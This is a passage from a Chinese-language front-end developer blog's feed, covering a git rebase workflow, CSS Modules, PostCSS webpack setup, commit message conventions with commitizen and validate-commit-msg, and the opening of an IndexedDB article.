<code>master</code> 分支外再有 <code>develop</code> 分支，那么在本地开发中应基于 <code>develop</code> 分支创建一个自定义分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git checkout develop</span><br><span class="line">git branch -b minfive</span><br></pre></td></tr></table></figure><p>然后在自定义分支上执行任意开发，一个功能点开发完成后，使用 rebase 整理合并所有新增 commit 为单个符合 <a href="/2017/09/08/2017-09-08-git-commit-message/">commit message 规范</a> 的 commit，每完成一个完整功能点整理合并一次 commit，开发完成后再通过 rebase 将整理过 commit 的自定义分支合并到 <code>develop</code> 分支。</p><p>到这一步，本地开发已完成，需要提交代码到服务器，那么请使用 <code>git pull --rebase</code> 拉取服务器最新 commit 并 rebase 合并到 <code>develop</code> 分支。有冲突解决冲突，没冲突则可以直接 push 代码上服务器。</p><blockquote><p>注：应尽可能保持自定义分支与开发分支的同步，一般情况下，每更新一次开发分支，笔者都会基于开发分支重建一次自定义分支用来保证 rebase 基准点的准确性。</p></blockquote><p>然后剩下的其它流程基本与 git flow 工作流程一致。</p><p>这样一套流程下来，commit 的流向如下图：</p><p><img src="http://blog.static.minfive.com/post/17-10-06/git-rebase.png" alt="git-rebase"></p><p>而不会出现多余的合并 commit 出现：</p><p><img src="http://blog.static.minfive.com/post/17-10-06/git-merge.png" alt="git-merge"></p><p>简直是强迫症解救神器啊！！！</p><blockquote><p>另：附上 <a href="https://github.com/MinFE/git-rebase-demo" target="_blank" rel="noopener">demo</a> 一枚。</p></blockquote><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ul><li><a href="https://git-scm.com/book/zh/v2" target="_blank" rel="noopener">Pro Git book</a></li><li><a href="http://gitbook.liuhui998.com/4_2.html" target="_blank" rel="noopener">Git Community book</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;上篇文章讲到 &lt;a href=&quot;/2017/09/08/2017-09-08-git-commit-message/&quot;&gt;commit mes
      
    
    </summary>
    
      <category term="经验总结" scheme="http://blog.minfive.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="git" scheme="http://blog.minfive.com/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>Css Modules 小试</title>
    <link href="http://blog.minfive.com/2017/10/04/2017-10-04-css-module/"/>
    <id>http://blog.minfive.com/2017/10/04/2017-10-04-css-module/</id>
    <published>2017-10-03T16:00:00.000Z</published>
    <updated>2019-03-31T13:22:59.152Z</updated>
    
    <content type="html"><![CDATA[<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>一个css模块即一个定义好了所有样式（类）和动画名称的本地css文件</p><blockquote><p>官方推荐仅使用类来定义样式</p></blockquote><p>CSS Modules 会编译成一种低层级的ICSS，但它的格式与正常css格式相似</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* style.css */</span></span><br><span class="line"><span class="selector-class">.className</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: green;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当使用js模块导入css模块时，它输出一个属性与本地样式名称相对应的对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> styles <span class="keyword">from</span> <span class="string">'./style.css'</span>;</span><br><span class="line"></span><br><span class="line">element.innerHTML = <span class="string">'&lt;div class="'</span> + styles.className + <span class="string">'"&gt;'</span>;</span><br></pre></td></tr></table></figure><h3 id="命名"><a href="#命名" class="headerlink" title="命名"></a>命名</h3><hr><p>对于本地类名建议使用驼峰命名，但并非强制</p><blockquote><p>关于使用驼峰命名的方式主要是为了更好在js中导入并使用css模块</p></blockquote><p>可以为css-loader增加camelCase参数来实现自动转换</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    test: <span class="regexp">/\.css$/</span>,</span><br><span class="line">    loader: <span class="string">'style!css?modules&amp;camelCase'</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><p><code>:global</code>: 切换到当前选择器所在全局作用域下<br><code>:local</code>: 切换到局部作用域下</p><p>如果切换到全局模式下，定义的样式将允许在全局作用域中使用</p><p>Example:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.localA</span> <span class="selector-pseudo">:global</span> <span class="selector-class">.global-b</span> <span class="selector-class">.global-c</span> <span class="selector-pseudo">:local(.localD.localE)</span> <span class="selector-class">.global-d</span></span><br></pre></td></tr></table></figure></p><h3 id="组合"><a href="#组合" class="headerlink" title="组合"></a>组合</h3><p>用于组合其它选择器</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.className</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: green;</span><br><span class="line">    <span class="attribute">background</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.otherClassName</span> &#123;</span><br><span class="line">    <span class="attribute">composes</span>: className;</span><br><span class="line">    <span class="attribute">color</span>: yellow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>允许拥有多个组成规则，但组成规则必须先于其它规则。当一个类composes另外一个类时，css模块对外的接口为当前类名，允许添加多个类名。</p><p>组成规则允许使用多个类：<code>composes: classNameA classNameB</code></p><h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><p>允许compose其它CSS Modules的类名</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.otherClassName</span> &#123;</span><br><span class="line">    <span class="attribute">composes</span>: className from <span class="string">'./style.css'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：</p><ol><li>当从不同的文件composes多个类时，compose的顺序是不确定的，因此，需要确保composes的类没有定义相同的属性值</li><li>compose不应该循环嵌套，因为Elsewise是无法确定这是组成规则还是属性，模块系统将会发出一个错误。</li><li>最好的方式就是基本类与依赖分离</li></ol><h3 id="为什么使用CSS-Modules"><a href="#为什么使用CSS-Modules" class="headerlink" title="为什么使用CSS Modules"></a>为什么使用CSS Modules</h3><p>模块化和可重复使用的css</p><ul><li>解决命名冲突</li><li>显式依赖</li><li>没有全局作用域</li></ul><h3 id="编译结果"><a href="#编译结果" class="headerlink" title="编译结果"></a>编译结果</h3><p>默认为哈希字符串<br><img src="https://sfault-image.b0.upaiyun.com/127/065/1270651827-571acfceca712" alt="image"></p><p>允许自定义配置<br><img src="https://sfault-image.b0.upaiyun.com/431/079/431079432-571acff0052ea" alt="image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;定义&quot;&gt;&lt;a href=&quot;#定义&quot; class=&quot;headerlink&quot; title=&quot;定义&quot;&gt;&lt;/a&gt;定义&lt;/h3&gt;&lt;p&gt;一个css模块即一个定义好了所有样式（类）和动画名称的本地css文件&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;官方推荐仅使用类来定义样式&lt;/
      
    
    </summary>
    
      <category term="日常学习" scheme="http://blog.minfive.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="css" scheme="http://blog.minfive.com/tags/css/"/>
    
      <category term="css modules" scheme="http://blog.minfive.com/tags/css-modules/"/>
    
  </entry>
  
  <entry>
    <title>Postcss 小试</title>
    <link href="http://blog.minfive.com/2017/10/02/2017-10-02-postcss-test/"/>
    <id>http://blog.minfive.com/2017/10/02/2017-10-02-postcss-test/</id>
    <published>2017-10-01T16:00:00.000Z</published>
    <updated>2019-03-31T13:22:59.153Z</updated>
    
    <content type="html"><![CDATA[<h3 id="What-is-postcss"><a href="#What-is-postcss" class="headerlink" title="What is postcss"></a>What is postcss</h3><ul><li>PostCSS 为基于 JavaScript 开发的 css 后处理器</li><li>PostCSS 提供了一个解析器，它能够将 CSS 解析成抽象语法树（AST）</li><li>PostCSS 的实际强悍之处为插件系统，依赖插件系统可以对 CSS 做任意处理</li></ul><p><img src="http://oo12ugek5.bkt.clouddn.com/postcss-demo/239162490-562dd5c1849a6_articlex.png" alt="图片"></p><h3 id="What-can-it-do"><a href="#What-can-it-do" class="headerlink" title="What can it do"></a>What can it do</h3><ul><li>对 CSS 文件做任意后期处理（即 PostCss 称为 css 后处理器的原因），例如：autoprefixer</li><li>扩展 css 语法 例如：cssnext</li></ul><h3 id="how-to-use"><a href="#how-to-use" class="headerlink" title="how to use"></a>how to use</h3><p><a href="https://github.com/postcss/postcss#usage" target="_blank" rel="noopener">doc.usage</a></p><h3 id="webpack配置"><a href="#webpack配置" class="headerlink" title="webpack配置"></a>webpack配置</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">use: [</span><br><span class="line"><span class="string">'css-loader'</span>,</span><br><span class="line">&#123;</span><br><span class="line">loader: <span class="string">'postcss-loader'</span>,</span><br><span class="line">options: &#123;</span><br><span class="line">plugins: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="built_in">require</span>(<span class="string">'postcss-import'</span>),</span><br><span class="line">    <span class="built_in">require</span>(<span class="string">'postcss-css-variables'</span>)(&#123; <span class="attr">preserve</span>: <span class="literal">false</span> &#125;),</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'postcss-cssnext'</span>)(&#123;</span><br><span class="line">    browsers: [</span><br><span class="line">    <span class="string">"&gt; 1%"</span>,</span><br><span class="line">        <span class="string">"last 2 versions"</span></span><br><span class="line">    ]</span><br><span class="line">    &#125;)</span><br><span class="line">]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="Features-CSS"><a href="#Features-CSS" class="headerlink" title="Features CSS"></a>Features CSS</h2><h3 id="未来语法"><a href="#未来语法" class="headerlink" title="未来语法"></a>未来语法</h3><ul><li>嵌套</li><li>自定义属性</li><li>…</li></ul><p>基于 PostCSS 可以将未来语法转换为现阶段的语法。</p><p><a href="http://cssnext.io/features/" target="_blank" rel="noopener">features</a></p><h3 id="note"><a href="#note" class="headerlink" title="note"></a>note</h3><ul><li>PostCss 的处理顺序依赖插件的顺序，错误的顺序可能带来意想不到的编译结果</li><li>PostCss 总体还不大成熟，对于自定义属性仅在 <code>:root</code> 下的支持比较完美，局部作用域总会出现意想不到的问题</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;What-is-postcss&quot;&gt;&lt;a href=&quot;#What-is-postcss&quot; class=&quot;headerlink&quot; title=&quot;What is postcss&quot;&gt;&lt;/a&gt;What is postcss&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;PostCSS 为基于 
      
    
    </summary>
    
      <category term="日常学习" scheme="http://blog.minfive.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="postcss" scheme="http://blog.minfive.com/tags/postcss/"/>
    
  </entry>
  
  <entry>
    <title>Commit Message 规范 及自动化 Changelog</title>
    <link href="http://blog.minfive.com/2017/09/08/2017-09-08-git-commit-message/"/>
    <id>http://blog.minfive.com/2017/09/08/2017-09-08-git-commit-message/</id>
    <published>2017-09-07T16:52:53.000Z</published>
    <updated>2019-03-31T13:22:59.153Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>文章假设读者了解并使用过 git ，不熟悉的同学请移步 <a href="https://git-scm.com/book/zh/v2" target="_blank" rel="noopener">pro git</a>。</p><p>使用过 git 来做版本控制的同学应该都知道每次提交修改 <code>git commit</code> 时，git 总会强制要求填写提交说明，否则不允许提交。填写的格式不限，内容也不限，当然为了提高项目的可维护性，commit message 做适当的格式要求是必要的，不说 review 起来方便，就冲看起来格式规整这一点，看起来都舒服得多了。</p><p>例子：</p><p><img src="http://blog.static.minfive.com/post/17-09-07/git-commit-bad.png" alt="bad-git-commit"></p><p><img src="http://blog.static.minfive.com/post/17-09-07/angular-commit.png" alt="angular-commit"></p><p>话题转回 commit message 规范，社区总结了许多 <a href="https://github.com/conventional-changelog/conventional-changelog" target="_blank" rel="noopener">commit 规范</a>，其中包括：</p><p><a href="http://blog.static.minfive.com/post/17-09-07/commit-norm-list.png" target="_blank" rel="noopener">commit-norm-list</a></p><p>笔者倾向于使用 angular 的 commit message 规范，更系统，本文也将使用该规范为例。</p><h3 id="commit-message-格式"><a href="#commit-message-格式" class="headerlink" title="commit message 格式"></a>commit message 格式</h3><p>commit message 主要包括三个部分：Header、Body、Footer。</p><p>格式为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;footer&gt;</span><br></pre></td></tr></table></figure></p><p>除 Header 外，Body、Footer均为非必填项。</p><h4 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h4><p>Header 要求单行，其中包括 <code>&lt;type&gt;</code>、<code>&lt;scope&gt;</code>、<code>&lt;subject&gt;</code>三个部分。</p><h5 id="type"><a href="#type" class="headerlink" title="type"></a><code>type</code></h5><p>用来标识 commit 的类型，总共有以下 11 个标识：</p><ul><li><code>feat</code>: 添加了一个新功能</li><li><code>fix</code>: 修复了一个 bug</li><li><code>docs</code>: 文档发生修改</li><li><code>style</code>: 不影响代码运行的更改（空格，格式，缺少分号等）</li><li><code>refactor</code>: 重构代码且不引进新的功能或修复 bug</li><li><code>perf</code>: 代码优化</li><li><code>test</code>: 添加或修改测试用例</li><li><code>build</code>: 构建工具或外部依赖的更改（npm，webpack，gulp等）</li><li><code>ci</code>: 更改项目级的配置文件或脚本</li><li><code>chore</code>: 除上述之外的修改</li><li><code>revert</code>: 撤销改动先前的提交</li></ul><blockquote><p>特别注意：使用 <code>revert</code> 标识撤销 commit 时，<code>subject</code> 应为所撤销的 commit 的 message， Body 应包含 所撤销的 commit 的 hash。</p></blockquote><p>格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">revert: fix: change aa to bb</span><br><span class="line">    </span><br><span class="line">This reverts commit ca1b58f63fcaa2ae763a5604e5b46e802d83105c.</span><br></pre></td></tr></table></figure><h5 id="scope"><a href="#scope" class="headerlink" title="scope"></a><code>scope</code></h5><p>用来标识改动所影响的范围，视项目而定。</p><h5 id="subject"><a href="#subject" class="headerlink" title="subject"></a><code>subject</code></h5><p>改动的简短描述，不超过 50 字符长度。</p><h4 id="Body"><a href="#Body" class="headerlink" title="Body"></a>Body</h4><p>本次 commit 的详细描述。</p><h4 id="Footer"><a href="#Footer" class="headerlink" title="Footer"></a>Footer</h4><p>主要用于两种情况：</p><ul><li>重大的不兼容改动: 用于给出改动说明及解决方案。</li><li>关联 issues: 用于关闭相应 issues。</li></ul><h3 id="高效使用"><a href="#高效使用" class="headerlink" title="高效使用"></a>高效使用</h3><p>上边介绍了如何按规范写 commit message，那么下面教你如何利用工具更高效的使用这套规范。</p><p>首先我们来介绍几个工具包:</p><h4 id="commitizen"><a href="#commitizen" class="headerlink" title="commitizen"></a><a href="https://github.com/commitizen/cz-cli#making-your-repo-commitizen-friendly" target="_blank" rel="noopener">commitizen</a></h4><p>commitizen 是用来快速生成指定的 commit message 规范的工具包，具体使用方式请参照 <a href="https://github.com/commitizen/cz-cli#making-your-repo-commitizen-friendly" target="_blank" rel="noopener">官方文档</a> 或参照下文给出的 demo。</p><blockquote><p>注： 官方推荐全局安装，然后使用全局 <code>git-cz</code> 命令来快速生成 commit message，但是由于笔者极不喜欢污染全局环境，所以以下例子中使用局部安装的方式来使用该包</p></blockquote><p>安装相应依赖包：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev commitizen cz-conventional-changelog</span><br></pre></td></tr></table></figure></p><p>添加如下启动脚本至项目根目录, 文件名假定为 <code>git-cz.js</code> ：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> bootstrap = <span class="built_in">require</span>(<span class="string">'commitizen/dist/cli/git-cz'</span>).bootstrap;</span><br><span class="line"></span><br><span class="line">bootstrap(&#123;</span><br><span class="line">    cliPath: path.join(__dirname, <span class="string">'./node_modules/commitizen'</span>),</span><br><span class="line">    config: &#123;</span><br><span class="line">        path: path.join(__dirname, <span class="string">'./node_modules/cz-conventional-changelog'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>添加 npm 脚本命令进 package.json 中:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="string">"srcipt"</span>: &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="string">"git-cz"</span>: <span class="string">"node run git-cz.js"</span></span><br><span class="line">        ...</span><br><span class="line">    &#125; </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ok，做到这一步大功告成，使用 <code>npm run git-cz</code> 即可启动该工具包，但是：笔者认为键入 npm 命令启动总觉得于 git 分格格格不入，因此有了下面的另一步：</p><p>使用 git 别名来启动 npm 命令（关于 git 别名请参考 <a href="https://git-scm.com/book/zh/v2/Git-%E5%9F%BA%E7%A1%80-Git-%E5%88%AB%E5%90%8D" target="_blank" rel="noopener">pro git</a>）:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config alias.cz '!npm run git-cz'</span><br></pre></td></tr></table></figure><p>然后就可以愉快的使用 <code>git cz</code> 快速生成符合规范的 commit message了。</p><h4 id="validate-commit-msg"><a href="#validate-commit-msg" class="headerlink" title="validate-commit-msg"></a><a href="https://github.com/conventional-changelog/validate-commit-msg" target="_blank" rel="noopener">validate-commit-msg</a></h4><p>用于检查 当前项目的 commit message 是否符合格式，下例中使用 <a href="https://github.com/ghooks-org/ghooks" target="_blank" rel="noopener">ghooks</a> 配合使用</p><p>使用 npm 安装:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev validate-commit-msg ghooks</span><br></pre></td></tr></table></figure><p>在项目根目录中新建 <code>.vcmrc</code> 配置文件（具体参数作用请参照该项目 REAMDE），文件内容如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"types"</span>: [</span><br><span class="line">        <span class="string">"feat"</span>,</span><br><span class="line">        <span class="string">"fix"</span>,</span><br><span class="line">        <span class="string">"docs"</span>,</span><br><span class="line">        <span class="string">"style"</span>,</span><br><span class="line">        <span class="string">"refactor"</span>,</span><br><span class="line">        <span class="string">"perf"</span>,</span><br><span class="line">        <span class="string">"test"</span>,</span><br><span class="line">        <span class="string">"build"</span>,</span><br><span class="line">        <span class="string">"ci"</span>,</span><br><span class="line">        <span class="string">"chore"</span>,</span><br><span class="line">        <span class="string">"revert"</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">"scope"</span>: &#123;</span><br><span class="line">        <span class="string">"required"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">"allowed"</span>: [<span class="string">"*"</span>],</span><br><span class="line">        <span class="string">"validate"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">"multiple"</span>: <span class="literal">false</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"warnOnFail"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"maxSubjectLength"</span>: <span class="number">100</span>,</span><br><span class="line">    <span class="string">"subjectPattern"</span>: <span class="string">".+"</span>,</span><br><span class="line">    <span class="string">"subjectPatternErrorMsg"</span>: <span class="string">"subject does not match subject pattern!"</span>,</span><br><span class="line">    <span class="string">"helpMessage"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="string">"autoFix"</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将以下配置写入 package.json 文件的环境配置中:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="string">"config"</span>: &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="string">"ghooks"</span>: &#123;</span><br><span class="line">            <span class="string">"commit-msg"</span>: <span class="string">"validate-commit-msg"</span></span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ok，配置完成后，该项目每次 commit 时，都将启动该脚本进行检测，如 commit message 格式不正确，本次 commit 失败。</p><blockquote><p>注: 有兴趣的同学可以去阅读 ghooks 源码，以及了解什么是 git hooks。</p></blockquote><h4 id="standard-version"><a href="#standard-version" class="headerlink" title="standard-version"></a><a href="https://github.com/conventional-changelog/standard-version" target="_blank" rel="noopener">standard-version</a></h4><p>用于依据 commit message 生成 changelog 以及版本发布。</p><p><em>注：</em>默认情况下 changelog 只根据 type 为 <code>feat</code> 和 <code>fix</code> 类型的 commit message 来生成。</p><p>使用 npm 安装:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev standard-version</span><br></pre></td></tr></table></figure><p>添加 npm 脚本命令进 package.json 中:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="string">"srcipt"</span>: &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="string">"release"</span>: <span class="string">"standard-version"</span></span><br><span class="line">        ...</span><br><span class="line">    &#125; </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行 <code>npm run release</code> 即可快速生成 changelog 以及生成相应版本 tag，具体使用方式请查阅该项目介绍。</p><p>综合上述关于 commit message 的规范以及日常开发中对 git 的使用，笔者写了一个小 <a href="https://github.com/MinFE/git-commit-lint" target="_blank" rel="noopener">demo</a>，具体内容如下：</p><ul><li>使用 <code>git cz</code> 快速生成符合规范的 commit message</li><li>使用 git hooks commit-msg 配合 <code>validate-commit-msg</code> 校验 commit message 格式，保证格式统一</li><li>使用 git hooks post-merge 及相应脚本对合并到 master 分支操作进行绑定，当从其它分支合并到 master 分支时，自动生成 changelog 及相应版本的tag</li></ul><p>甚至可以利用 git hooks 做更多自动化的工作，有兴趣的同学可以去尝试下。</p><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ul><li><a href="http://www.ruanyifeng.com/blog/2016/01/commit_message_change_log.html" target="_blank" rel="noopener">Commit message 和 Change log 编写指南</a></li><li><a href="https://segmentfault.com/a/1190000004282514" target="_blank" rel="noopener">［译］AngularJS Git提交信息规范</a></li><li><a href="https://git-scm.com/book/zh/v2" target="_blank" rel="noopener">Pro Git book</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;文章假设读者了解并使用过 git ，不熟悉的同学请移步 &lt;a href=&quot;https://git-scm.com/book/zh/v2&quot; t
      
    
    </summary>
    
      <category term="日常学习" scheme="http://blog.minfive.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="git" scheme="http://blog.minfive.com/tags/git/"/>
    
      <category term="学习" scheme="http://blog.minfive.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="规范" scheme="http://blog.minfive.com/tags/%E8%A7%84%E8%8C%83/"/>
    
      <category term="自动化" scheme="http://blog.minfive.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>客户端存储indexedDB探究</title>
    <link href="http://blog.minfive.com/2016/05/15/%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AD%98%E5%82%A8indexedDB%E6%8E%A2%E7%A9%B6/"/>
    <id>http://blog.minfive.com/2016/05/15/客户端存储indexedDB探究/</id>
    <published>2016-05-14T16:00:00.000Z</published>
    <updated>2019-03-31T13:22:59.153Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>趁着最近清闲，把先前落下的红宝书下半部分给看完了，最感冒的是客户端存储，WebSocket以及canvas（WebGL），WebSocket这个我就不说了，剩下的一个是我认为将来会在移动应用上大显身手的东西，一个则是前端可视化大趋势下必不可少的东西，canvas（WebGL）的话因为暂时还没入坑，所以先不讲，以后研究完了会补上来，这篇文章就主讲客户端存储。</p><blockquote><p>文章基于《javascript高级程序设计》23章以及MDN技术文档加上个人的一些见解，结构主体是技术文档，穿插一些个人踩坑的总结，如见解有误，请指出，谢谢！</p></blockquote><hr><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><code>IndexedDB</code>本片文章的主人公，在红包书中的解释是:”Indexed Database API,是在浏览器中保存结构化数据的一种<code>数据库</code>“，对的！你没看错，就是数据库，而且是一种类SQL的结构型数据库，最大的特色就是用对象来存储数据，容量以及数据存储查询速度远比storage（local/session）好的多，但缺点就是支持程度还不是很好。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>由于目前兼容性的问题，所以使用前需要对浏览器提供的API进行兼容：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.indexedDB = <span class="built_in">window</span>.indexedDB || <span class="built_in">window</span>.mozIndexedDB || <span class="built_in">window</span>.webkitIndexedDB || <span class="built_in">window</span>.msIndexedDB;</span><br><span class="line"><span class="built_in">window</span>.IDBTransaction = <span class="built_in">window</span>.IDBTransaction || <span class="built_in">window</span>.webkitIDBTransaction || <span class="built_in">window</span>.msIDBTransaction;</span><br><span class="line"><span class="built_in">window</span>.IDBKeyRange = <span class="built_in">window</span>.IDBKeyRange || <span class="built_in">window</span>.webkitIDBKeyRange || <span class="built_in">window</span>.msIDBKeyRange;</span><br></pre></td></tr></table></figure><h4 id="基本使用模式"><a href="#基本使用模式" class="headerlink" 